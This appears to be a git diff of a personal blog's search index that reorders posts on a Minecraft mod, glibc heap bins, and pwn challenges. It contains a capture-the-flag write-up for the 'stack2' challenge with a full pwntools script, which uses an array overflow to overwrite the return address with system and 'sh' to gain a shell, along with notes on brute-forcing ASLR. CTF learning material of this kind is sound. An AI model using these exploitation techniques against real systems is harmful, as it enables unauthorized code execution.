@@ -1,16 +1,6 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>first blog</title>
-    <url>/2021/11/29/first-blog/</url>
-    <content><![CDATA[<p>Test</p>
-<p>1.</p>
-<p>2.</p>
-<p>3.</p>
-<p>4.</p>
-]]></content>
-  </entry>
-  <entry>
     <title>Minecraft_fabric_1.0</title>
     <url>/2021/12/04/Minecraft-fabric-1-0/</url>
     <content><![CDATA[<p>fabrcmod<br>版本：1.17.1<br>任务：添加项目</p>
@@ -25,40 +15,6 @@
       <tags>
         <tag>Mincraft_fabric_mod</tag>
       </tags>
-  </entry>
-  <entry>
-    <title>pwn_简单的爆破1.0</title>
-    <url>/2021/12/06/pwn-%E7%AE%80%E5%8D%95%E7%9A%84%E7%88%86%E7%A0%B41-0/</url>
-    <content><![CDATA[<p>如题，一个简单的爆破</p>
-<p>平台：linux</p>
-<p>原理：一个elf文件会默认开启ASLR，随机化系统调用的地址。随机化的方式是在原地址的基础上加上一个较大的数字例如__libc_start_main在libc-2.28.so中的地址是0x23fb0，开启随机化后地址变为0x7ffff7e1209b，相应的，one_gadget的地址0x4497f变为了0x7ffff7e3297f，对比 _libc_start_main随机化后的地址发现，只有末尾的六位十六进制数字是不同的。<br>可以利用这个原理在不知道偏移的情况下，覆盖_libc_start_main地址的后六位直接爆破。由于随机化后的地址最后三位与原地址相同，所以实际需要爆破的数字只有三位，三位十六进制数字需要爆破4096次，在可接受范围内。<br>为了验证自己的想法，自己写了一个elf文件，以下是c语言源码（图中部分的代码是实验时为了方便观测所写的，不涉及解题过程）：<br><img src="/images/pasted-6.png" alt="upload successful"><br>这是ida反编译的结果：<br><img src="/images/pasted-7.png" alt="upload successful"><br>没有其他内容，所以直接上python脚本（python3）：<br><img src="/images/pasted-8.png" alt="upload successful"><br>程序异常退出后再进行recv()操作会直接报错，可捕获这个报错，实现脚本的多次执行,最后附上运行结果<br><img src="/images/pasted-9.png" alt="upload successful"></p>
-]]></content>
-      <categories>
-        <category>pwn</category>
-      </categories>
-      <tags>
-        <tag>爆破的初尝试</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>攻防世界-stack2</title>
-    <url>/2022/02/12/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-stack2/</url>
-    <content><![CDATA[<p>关键词：数组溢出，栈溢出</p>
-<p>检查防护，32位程序，开启了NX和cannry<br><img src="/images/pasted-10.png" alt="upload successful"><br>运行程序<br><img src="/images/pasted-11.png" alt="upload successful"><br>在ida中查看，程序中的change number功能可以溢出数组，更改数组任意位置的值。程序中存在hacktherede函数<br><img src="/images/pasted-12.png" alt="upload successful">到这里做题的思路基本就有了，通过数组溢出的漏洞直接更改return的地址为hackhere的地址。<br>然而在做题的过程中发现这题有大坑，首先是程序的入口和出口进行了微调，ida中查看的栈的偏移不准确。用gdb调试程序，在mov     [eax], cl和retn的位置下断点<br><img src="/images/pasted-13.png" alt="upload successful"></p>
-<p><img src="/images/pasted-14.png" alt="upload successful"><br>在mov eax，cl位置查看的返回地址是0xffffbd8c，而在retn位置查看的返回地址是0xffffbd9c<br><img src="/images/pasted-15.png" alt="upload successful"></p>
-<p><img src="/images/pasted-16.png" alt="upload successful"><br>所以真实的偏移地址是0x84，通过数组溢出更改返回地址，但是在第一次运行脚本时发现程序中没有bash，无法直接用后门函数后的shell。那么只能自己构造ROP，在程序中找到了“sh”的字符串，把system得plt地址以及sh的地址发送过去，可以成功获取shell。<br><img src="/images/pasted-17.png" alt="upload successful"><br>运行结果以及完整wp  </p>
-<p>from pwn import *<br>io = process(“./stack2”)<br>#io = remote(“111.200.241.244”,50757)<br>def SEND(aa,bb): </p>
-<pre><code>        io.sendlineafter(&#39;exit\n&#39;, b&#39;3&#39;)  
-        io.sendlineafter(&#39;to change:\n&#39;, str(aa))  
-        io.sendlineafter(&#39;new number:\n&#39;, str(bb))
-</code></pre>
-<p>system_add = 0x8048450<br>sh_add = 0x08048987<br>io.sendline(b’1’)<br>io.sendline(b’1’)<br>#system<br>SEND(0x84,0x50)<br>SEND(0x85,0x84)<br>SEND(0x86,0x04)<br>SEND(0x87,0x08)<br>#sh<br>SEND(0x8c,0x87)<br>SEND(0x8d,0x89)<br>SEND(0x8e,0x04)<br>SEND(0x8f,0x08)<br>io.sendline(b’5’)<br>#io.recv()<br>io.interactive()<br><img src="/images/pasted-18.png" alt="upload successful"></p>
-]]></content>
-  </entry>
-  <entry>
-    <title>测试</title>
-    <url>/2022/01/08/%E6%B5%8B%E8%AF%95/</url>
-    <content><![CDATA[]]></content>
   </entry>
   <entry>
     <title>堆</title>
@@ -96,16 +52,44 @@ free（void* p）：释放由 p 所指向的内存块，当 p 为空指针时，
 </li>
 </ol>
 </li>
-<li><p>bin<br>定义：ptmalloc 采用分箱式方法对空闲的 chunk 进行管理，首先，它会根据空闲的 chunk 的大小以及使用状态将 chunk 初步分为 4 类：fast bins，small bins，large bins，unsorted bin。<br>  small bins，large bins，unsorted bin：由ptmalloc 维护在同一个数组中，其对应的数据结构在malloc_state 中，其顺序是：</p>
-<pre><code>  1.第一个为 unsorted bin，字如其面，这里面的 chunk 没有进行排序，存储的 chunk 比较杂。
-  2.索引从 2 到 63 的 bin 称为 small bin，同一个 small bin 链表中的 chunk 的大小相同。两个相邻索引的 small bin 链表中的 chunk 大小相差的字节数为 2 个机器字长，即 32 位相差 8 字节，64 位相差 16 字节。
-  3.small bins 后面的 bin 被称作 large bins。large bins 中的每一个 bin 都包含一定范围内的 chunk，其中的 chunk 按 fd 指针的顺序从大到小排列。相同大小的 chunk 同样按照最近使用顺序排列。
-</code></pre>
-<p>   (任意两个物理相邻的空闲 chunk 不能在一起)<br>Fast Bin:大多数程序经常会申请以及释放一些比较小的内存块。如果将一些较小的 chunk 释放之后发现存在与之相邻的空闲的 chunk 并将它们进行合并，那么当下一次再次申请相应大小的 chunk 时，就需要对 chunk 进行分割，这样就大大降低了堆的利用效率。因为我们把大部分时间花在了合并、分割以及中间检查的过程中。因此，ptmalloc 中专门设计了 fast bin，对应的变量就是 malloc state 中的 fastbinsY<br>```<br>/*<br> Fastbins<br>  An array of lists holding recently freed small chunks.  Fastbins<br>  are not doubly linked.  It is faster to single-link them, and<br>  since chunks are never removed from the middles of these lists,<br>  double linking is not necessary. Also, unlike regular bins, they<br>  are not even processed in FIFO order (they use faster LIFO) since<br>  ordering doesn’t much matter in the transient contexts in which<br>  fastbins are normally used.</p>
-<p>  Chunks in fastbins keep their inuse bit set, so they cannot<br>  be consolidated with other free chunks. malloc_consolidate<br>  releases all chunks in fastbins and consolidates them with<br>  other free chunks.</p>
+<li><p>bin<br>定义：ptmalloc 采用分箱式方法对空闲的 chunk 进行管理，首先，它会根据空闲的 chunk 的大小以及使用状态将 chunk 初步分为 4 类：fast bins，small bins，large bins，unsorted bin。 </p>
+<p>  Fast Bin:<br>  chunk的大小在32字节<del>128字节（0x20</del>0x80）的chunk称为“fast chunk”，fast bin链表的个数为10个。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/*</span><br><span class="line">   Fastbins</span><br><span class="line">    An array of lists holding recently freed small chunks.  Fastbins</span><br><span class="line">    are not doubly linked.  It is faster to single-link them, and</span><br><span class="line">    since chunks are never removed from the middles of these lists,</span><br><span class="line">    double linking is not necessary. Also, unlike regular bins, they</span><br><span class="line">    are not even processed in FIFO order (they use faster LIFO) since</span><br><span class="line">    ordering doesn&#x27;t much matter in the transient contexts in which</span><br><span class="line">    fastbins are normally used.</span><br><span class="line"></span><br><span class="line">    Chunks in fastbins keep their inuse bit set, so they cannot</span><br><span class="line">    be consolidated with other free chunks. malloc_consolidate</span><br><span class="line">    releases all chunks in fastbins and consolidates them with</span><br><span class="line">    other free chunks.</span><br><span class="line"> */</span><br><span class="line">typedef struct malloc_chunk *mfastbinptr;</span><br><span class="line">/*</span><br><span class="line">    This is in malloc_state.</span><br><span class="line">    /* Fastbins */</span><br><span class="line">    mfastbinptr fastbinsY[ NFASTBINS ];</span><br><span class="line">*/</span><br></pre></td></tr></table></figure>
+<p><img src="/images/pasted-20.png" alt="upload successful"></p>
 </li>
 </ul>
-<p> <em>/<br>typedef struct malloc_chunk <em>mfastbinptr;<br>/</em><br>    This is in malloc_state.<br>    /</em> Fastbins */<br>    mfastbinptr fastbinsY[ NFASTBINS ];<br>*/```</p>
+<p>Unsorted Bin：<br>    当释放较小或较大的chunk的时候，如果系统没有将它们添加到对应的bins中，系统就将这些chunk添加到unsorted bin中。这主要是为了让“glibc malloc机制”能够有第二次机会重新利用最近释放的chunk(第一次机会就是fast bin机制)。利用unsorted bin，可以加快内存的分配和释放操作，因为整个操作都不再需要花费额外的时间去查找合适的bin了。  </p>
+<p>   Small Bin：<br>    小于1024字节（0x400）的chunk称之为small chunk，small bin就是用于管理small chunk的，small bin链表的个数为62个，就内存的分配和释放速度而言，small bin比larger bin快，但比fast bin慢。  </p>
+<p>   Large Bin：大于等于1024字节（0x400）的chunk称之为large chunk，large bin就是用于管理这些largechunk的，large bin链表的个数为63个，被分为6组，largechunk使用fd_nextsize、bk_nextsize连接起来的。</p>
+]]></content>
+  </entry>
+  <entry>
+    <title>pwn_简单的爆破1.0</title>
+    <url>/2021/12/06/pwn-%E7%AE%80%E5%8D%95%E7%9A%84%E7%88%86%E7%A0%B41-0/</url>
+    <content><![CDATA[<p>如题，一个简单的爆破</p>
+<p>平台：linux</p>
+<p>原理：一个elf文件会默认开启ASLR，随机化系统调用的地址。随机化的方式是在原地址的基础上加上一个较大的数字例如__libc_start_main在libc-2.28.so中的地址是0x23fb0，开启随机化后地址变为0x7ffff7e1209b，相应的，one_gadget的地址0x4497f变为了0x7ffff7e3297f，对比 _libc_start_main随机化后的地址发现，只有末尾的六位十六进制数字是不同的。<br>可以利用这个原理在不知道偏移的情况下，覆盖_libc_start_main地址的后六位直接爆破。由于随机化后的地址最后三位与原地址相同，所以实际需要爆破的数字只有三位，三位十六进制数字需要爆破4096次，在可接受范围内。<br>为了验证自己的想法，自己写了一个elf文件，以下是c语言源码（图中部分的代码是实验时为了方便观测所写的，不涉及解题过程）：<br><img src="/images/pasted-6.png" alt="upload successful"><br>这是ida反编译的结果：<br><img src="/images/pasted-7.png" alt="upload successful"><br>没有其他内容，所以直接上python脚本（python3）：<br><img src="/images/pasted-8.png" alt="upload successful"><br>程序异常退出后再进行recv()操作会直接报错，可捕获这个报错，实现脚本的多次执行,最后附上运行结果<br><img src="/images/pasted-9.png" alt="upload successful"></p>
+]]></content>
+      <categories>
+        <category>pwn</category>
+      </categories>
+      <tags>
+        <tag>爆破的初尝试</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>攻防世界-stack2</title>
+    <url>/2022/02/12/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-stack2/</url>
+    <content><![CDATA[<p>关键词：数组溢出，栈溢出</p>
+<p>检查防护，32位程序，开启了NX和cannry<br><img src="/images/pasted-10.png" alt="upload successful"><br>运行程序<br><img src="/images/pasted-11.png" alt="upload successful"><br>在ida中查看，程序中的change number功能可以溢出数组，更改数组任意位置的值。程序中存在hacktherede函数<br><img src="/images/pasted-12.png" alt="upload successful">到这里做题的思路基本就有了，通过数组溢出的漏洞直接更改return的地址为hackhere的地址。<br>然而在做题的过程中发现这题有大坑，首先是程序的入口和出口进行了微调，ida中查看的栈的偏移不准确。用gdb调试程序，在mov     [eax], cl和retn的位置下断点<br><img src="/images/pasted-13.png" alt="upload successful"></p>
+<p><img src="/images/pasted-14.png" alt="upload successful"><br>在mov eax，cl位置查看的返回地址是0xffffbd8c，而在retn位置查看的返回地址是0xffffbd9c<br><img src="/images/pasted-15.png" alt="upload successful"></p>
+<p><img src="/images/pasted-16.png" alt="upload successful"><br>所以真实的偏移地址是0x84，通过数组溢出更改返回地址，但是在第一次运行脚本时发现程序中没有bash，无法直接用后门函数后的shell。那么只能自己构造ROP，在程序中找到了“sh”的字符串，把system得plt地址以及sh的地址发送过去，可以成功获取shell。<br><img src="/images/pasted-17.png" alt="upload successful"><br>运行结果以及完整wp  </p>
+<p>from pwn import *<br>io = process(“./stack2”)<br>#io = remote(“111.200.241.244”,50757)<br>def SEND(aa,bb): </p>
+<pre><code>        io.sendlineafter(&#39;exit\n&#39;, b&#39;3&#39;)  
+        io.sendlineafter(&#39;to change:\n&#39;, str(aa))  
+        io.sendlineafter(&#39;new number:\n&#39;, str(bb))
+</code></pre>
+<p>system_add = 0x8048450<br>sh_add = 0x08048987<br>io.sendline(b’1’)<br>io.sendline(b’1’)<br>#system<br>SEND(0x84,0x50)<br>SEND(0x85,0x84)<br>SEND(0x86,0x04)<br>SEND(0x87,0x08)<br>#sh<br>SEND(0x8c,0x87)<br>SEND(0x8d,0x89)<br>SEND(0x8e,0x04)<br>SEND(0x8f,0x08)<br>io.sendline(b’5’)<br>#io.recv()<br>io.interactive()<br><img src="/images/pasted-18.png" alt="upload successful"></p>
 ]]></content>
   </entry>
 </search>
